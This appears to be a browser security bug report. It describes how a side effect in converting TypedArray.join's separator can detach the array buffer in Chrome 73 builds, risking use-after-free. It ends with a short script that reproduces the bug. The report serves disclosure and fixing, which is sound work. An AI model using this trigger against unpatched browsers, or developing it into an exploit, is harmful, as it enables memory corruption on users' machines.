<b>VULNERABILITY DETAILS</b>
While verifying the fix for bug 915783, I noticed another issue in |TypedArray.join|. Converting the |separator| argument to a string has side effects, and then the method doesn't ensure that the array buffer hasn't been detached. That might lead to a similar use-after-free condition.

<b>VERSION</b>
Google Chrome 73.0.3653.0 (Official Build) canary (64-bit) (cohort: Clang-64)
Google Chrome 73.0.3642.0 (Official Build) dev (64-bit) (cohort: Dev)

<b>REPRODUCTION CASE</b>
<script>
array = new Int8Array(1024 * 1024);
array.join({toString() {
  try {
    postMessage("", "", [array.buffer]);
  } catch { }
} });
</script>